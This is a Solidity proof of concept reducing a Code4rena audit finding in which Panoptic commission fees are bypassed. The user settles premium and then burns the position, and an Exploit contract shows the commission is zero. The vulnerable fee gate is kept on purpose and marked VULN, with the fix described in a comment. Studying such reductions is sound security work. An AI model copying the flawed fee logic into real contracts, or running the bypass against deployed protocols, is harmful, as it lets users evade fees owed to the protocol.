// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Panoptic — [H-03] Commission fees can always be bypassed
    (Code4rena 2025-12-panoptic-next-core, finding #65027, reporter prk0).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: CollateralTracker.settleBurn() takes commission as
    min(premiumFee, notionalFee). When called from _settleOptions() the
    long/short/ammDelta amounts are all 0, so notionalFee = 0 and commission
    is always 0. Separately, if realizedPremium == 0 the whole fee block is
    skipped. A user settles premium first (commission = 0), then burns
    (realizedPremium = 0 → skip) and pays nothing.

    Vulnerable settleBurn fee gate preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

uint256 constant DECIMALS = 10_000;

library Math {
    function mulDivRoundingUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        uint256 p = x * y;
        return (p + d - 1) / d;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

struct RiskParameters {
    uint256 premiumFee; // bps / DECIMALS scale
    uint256 notionalFee;
}

/// @notice Reduced CollateralTracker — settleBurn commission path.
contract CollateralTracker {
    address public panopticPool;
    mapping(address => int256) public balance; // signed collateral units
    uint256 public totalCommissionPaid;
    mapping(address => uint256) public commissionPaidBy;

    event CommissionPaid(address owner, uint256 fee);

    modifier onlyPanopticPool() {
        require(msg.sender == panopticPool, "pool");
        _;
    }

    function setPool(address p) external {
        require(panopticPool == address(0), "set");
        panopticPool = p;
    }

    function seed(address user, int256 amount) external {
        balance[user] = amount;
    }

    function _updateBalancesAndSettle(
        address optionOwner,
        bool, /*isCreation*/
        int128, /*longAmount*/
        int128, /*shortAmount*/
        int128, /*ammDeltaAmount*/
        int128 realizedPremium
    ) internal returns (int128, int128 tokenPaid, uint256, uint256) {
        // Premium settlement adjusts owner balance by realizedPremium
        balance[optionOwner] -= int256(realizedPremium);
        tokenPaid = realizedPremium;
        return (0, tokenPaid, 0, 0);
    }

    /// @notice Verbatim-shape settleBurn commission computation.
    function settleBurn(
        address optionOwner,
        int128 longAmount,
        int128 shortAmount,
        int128 ammDeltaAmount,
        int128 realizedPremium,
        RiskParameters memory riskParameters
    ) external onlyPanopticPool returns (int128) {
        (, int128 tokenPaid,,) =
            _updateBalancesAndSettle(optionOwner, false, longAmount, shortAmount, ammDeltaAmount, realizedPremium);

        // FIX: remove the realizedPremium != 0 gate; when long==short==0 use
        // premium fee alone as commission.
        if (realizedPremium != 0) { // @> VULN: gate skips fees on burn-after-settle; settle path min(notional=0)=0
            uint256 commissionFee;
            {
                uint256 commissionP;
                unchecked {
                    commissionP = realizedPremium > 0 ? uint256(uint128(realizedPremium)) : uint256(uint128(-realizedPremium));
                }
                uint256 commissionFeeP =
                    Math.mulDivRoundingUp(commissionP, riskParameters.premiumFee, DECIMALS);
                // notional base = |short| + |long| (simplified from report)
                uint256 commissionN;
                unchecked {
                    int256 s = int256(shortAmount);
                    int256 l = int256(longAmount);
                    int256 sum = s + l;
                    commissionN = uint256(sum >= 0 ? sum : -sum);
                }
                uint256 commissionFeeN =
                    Math.mulDivRoundingUp(commissionN, 10 * riskParameters.notionalFee, DECIMALS);

                // min(premium, notional) - notional is 0 in settle-premium flow
                commissionFee = Math.min(commissionFeeP, commissionFeeN); // @> VULN: min with notionalFee=0
            }

            if (commissionFee > 0) {
                balance[optionOwner] -= int256(uint256(commissionFee));
                totalCommissionPaid += commissionFee;
                commissionPaidBy[optionOwner] += commissionFee;
                emit CommissionPaid(optionOwner, commissionFee);
            }
        }

        return tokenPaid;
    }

    /// @notice Counterfactual: what commission WOULD be if charged on notional size alone.
    function quoteNotionalCommission(int128 longAmount, int128 shortAmount, RiskParameters memory rp)
        external
        pure
        returns (uint256)
    {
        int256 sum = int256(shortAmount) + int256(longAmount);
        uint256 commissionN = uint256(sum >= 0 ? sum : -sum);
        return Math.mulDivRoundingUp(commissionN, 10 * rp.notionalFee, DECIMALS);
    }
}

/// @notice Reduced PanopticPool — settle premium then burn (bypass path).
contract PanopticPool {
    CollateralTracker public ct0;
    RiskParameters public riskParameters;
    mapping(address => int128) public positionNotional; // long+short size
    mapping(address => int128) public pendingPremium;

    constructor(CollateralTracker _ct0, uint256 premiumFee, uint256 notionalFee) {
        ct0 = _ct0;
        riskParameters = RiskParameters({premiumFee: premiumFee, notionalFee: notionalFee});
    }

    function openPosition(address owner, int128 notional, int128 premium) external {
        positionNotional[owner] = notional;
        pendingPremium[owner] = premium;
    }

    /// @notice Flow 4/5: _settleOptions → settleBurn with long=short=amm=0.
    function settlePremium(address owner) external {
        int128 prem = pendingPremium[owner];
        pendingPremium[owner] = 0;
        // collateralToken0().settleBurn(owner, 0, 0, 0, realizedPremia, riskParameters)
        ct0.settleBurn(owner, 0, 0, 0, prem, riskParameters);
    }

    /// @notice Burn after premium settled: realizedPremium = 0, notional may still be set.
    function burnPosition(address owner) external {
        int128 notional = positionNotional[owner];
        positionNotional[owner] = 0;
        // burn path would pass long/short amounts, but premium already settled → 0 premium
        // If user settled first, realizedPremium=0 → commission skipped entirely
        ct0.settleBurn(owner, notional, 0, 0, 0, riskParameters);
    }

    /// @notice Honest single-step burn that would charge commission (premium+notional).
    function burnWithPremium(address owner) external {
        int128 notional = positionNotional[owner];
        int128 prem = pendingPremium[owner];
        positionNotional[owner] = 0;
        pendingPremium[owner] = 0;
        ct0.settleBurn(owner, notional, 0, 0, prem, riskParameters);
    }
}

/// @notice Charlie settles premium (commission 0), then burns (skip) — pays 0
///         while an honest burn would have paid > 0.
contract Exploit {
    CollateralTracker public ct; // 1
    PanopticPool public pool; // 2

    uint256 public commissionAfterBypass;
    uint256 public commissionHonestWouldPay;
    int128 public constant NOTIONAL = 1_000_000; // size units
    int128 public constant PREMIUM = 50_000;

    constructor() {
        ct = new CollateralTracker(); // 1
        // premiumFee = 10% of DECIMALS (1000/10000), notionalFee = 1% (100/10000)
        pool = new PanopticPool(ct, 1000, 100); // 2
        ct.setPool(address(pool));

        address charlie = address(this);
        ct.seed(charlie, 10_000_000);
        pool.openPosition(charlie, NOTIONAL, PREMIUM);
    }

    function run() external {
        // Counterfactual honest commission on notional (what burn-with-premium
        // would take as the min side — premium fee on 50k = 5k; notional fee
        // on 1e6 * 10 * 100 / 10000 = 100_000; min = 5000 if both non-zero).
        // Via settle-first: first call notionalFee base = 0 → commission 0;
        // second call realizedPremium = 0 → block skipped.
        RiskParameters memory rp = RiskParameters({premiumFee: 1000, notionalFee: 100});
        uint256 premFee = Math.mulDivRoundingUp(uint256(uint128(PREMIUM)), 1000, DECIMALS); // 5000
        uint256 notFee = ct.quoteNotionalCommission(NOTIONAL, 0, rp); // 100000
        commissionHonestWouldPay = Math.min(premFee, notFee); // 5000
        require(commissionHonestWouldPay > 0, "honest fee must be positive");

        // Bypass path: settle premium, then burn
        pool.settlePremium(address(this));
        pool.burnPosition(address(this));

        commissionAfterBypass = ct.totalCommissionPaid();
        require(commissionAfterBypass == 0, "commission not bypassed");
        require(ct.commissionPaidBy(address(this)) == 0, "user paid fee");
    }
}
